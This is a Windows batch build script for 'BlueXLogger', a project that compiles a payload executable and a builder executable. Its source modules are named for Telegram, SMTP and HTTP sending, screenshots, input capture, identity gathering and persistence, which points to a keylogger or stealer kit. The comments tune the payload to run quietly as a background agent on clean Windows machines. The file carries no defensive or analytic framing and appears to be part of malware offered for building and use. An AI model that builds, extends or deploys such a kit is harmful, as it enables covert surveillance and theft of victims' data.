@echo off
rem ===========================================================================
rem BlueXLogger - build/build.bat
rem Builds the resource generators, the payload, the builder and the tests.
rem Created by Xencode-CLI by xanthorox
rem
rem Toolchain (detected by build/preflight.bat, pinned here so the build is
rem reproducible on this machine):
rem   VS 2022 Build Tools  C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools
rem   MSVC                 14.42.34433
rem   Windows SDK          10.0.22621.0
rem
rem Object layout
rem   build\obj\common\   compiled once, linked into both EXEs and the tests
rem   build\obj\payload\  payload-only objects + resources
rem   build\obj\builder\  builder-only objects + resources
rem ===========================================================================
setlocal enabledelayedexpansion
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" >nul 2>&1
if errorlevel 1 (
    echo BUILD_FAILED: vcvars64.bat not found or failed
    exit /b 1
)

cd /d "%~dp0.."
if not exist build\obj\tools   mkdir build\obj\tools
if not exist build\obj\common  mkdir build\obj\common
if not exist build\obj\payload mkdir build\obj\payload
if not exist build\obj\builder mkdir build\obj\builder
if not exist build\bin mkdir build\bin

rem /MT statically links the CRT into every binary. This is deliberate and is
rem not the compiler default on every toolchain: a dynamically linked payload
rem would refuse to start on a machine without the matching Visual C++
rem Redistributable, which is not something a background agent can rely on.
rem Pinning it here keeps the "runs on a clean Windows install" property
rem reproducible instead of a side effect of one machine's toolchain defaults.
set CFLAGS=/nologo /c /MT /W4 /WX- /O2 /D_CRT_SECURE_NO_WARNINGS /DNDEBUG /Iinclude /Ires
set LDFLAGS=/nologo /SUBSYSTEM:WINDOWS /OPT:REF /OPT:ICF /DYNAMICBASE /NXCOMPAT
set LIBS=user32.lib gdi32.lib shell32.lib advapi32.lib ole32.lib oleaut32.lib ws2_32.lib secur32.lib crypt32.lib windowscodecs.lib uxtheme.lib

echo.
echo === [1/6] resource generators ===========================================
cl /nologo /MT /W4 /O2 /D_CRT_SECURE_NO_WARNINGS /Fobuild\obj\tools\ /Febuild\bin\gen_slot.exe tools\gen_slot.c || goto :fail
cl /nologo /MT /W4 /O2 /D_CRT_SECURE_NO_WARNINGS /Fobuild\obj\tools\ /Febuild\bin\gen_ico.exe  tools\gen_ico.c  || goto :fail
build\bin\gen_slot.exe res\cfg_slot.bin || goto :fail
build\bin\gen_ico.exe  res\bluexlogger.ico || goto :fail

echo.
echo === [2/6] common layer ==================================================
cl %CFLAGS% /Fobuild\obj\common\ ^
   src\common\bxl_config.c src\common\bxl_util.c src\common\bxl_base64.c ^
   src\common\bxl_format.c src\common\bxl_schedule.c src\common\bxl_logbuf.c ^
   src\common\bxl_mime.c src\common\bxl_net.c src\common\bxl_smtp.c ^
   src\common\bxl_http.c src\common\bxl_telegram.c src\common\bxl_identity.c ^
   src\common\bxl_screenshot.c src\common\bxl_context.c src\common\bxl_capture.c ^
   src\common\bxl_persist.c src\common\bxl_patch.c || goto :fail

echo.
echo === [3/6] payload =======================================================
cl %CFLAGS% /Fobuild\obj\payload\ src\payload\main.c || goto :fail
rc /nologo /Iinclude /Ires /fo build\obj\payload\payload.res res\payload.rc || goto :fail
link %LDFLAGS% /OUT:build\bin\BlueXLogger.exe ^
     build\obj\common\*.obj build\obj\payload\*.obj build\obj\payload\*.res %LIBS% || goto :fail

echo.
echo === [4/6] builder =======================================================
if not exist src\builder\main.c (
    echo   skipped: src\builder\main.c not present yet
    goto :tests
)
cl %CFLAGS% /Fobuild\obj\builder\ src\builder\*.c || goto :fail
rc /nologo /Iinclude /Ires /fo build\obj\builder\builder.res res\builder.rc || goto :fail
link %LDFLAGS% /OUT:build\bin\BlueXBuilder.exe ^
     build\obj\common\*.obj build\obj\builder\*.obj build\obj\builder\*.res %LIBS% || goto :fail

:tests
echo.
echo === [5/6] tests =========================================================
if not exist tests\run_tests.bat (
    echo   skipped: tests\run_tests.bat not present yet
    goto :done
)
call tests\run_tests.bat || goto :fail

:done
echo.
echo === [6/6] BUILD_OK ======================================================
dir /b build\bin
endlocal
exit /b 0

:fail
echo.
echo BUILD_FAILED
endlocal
exit /b 1
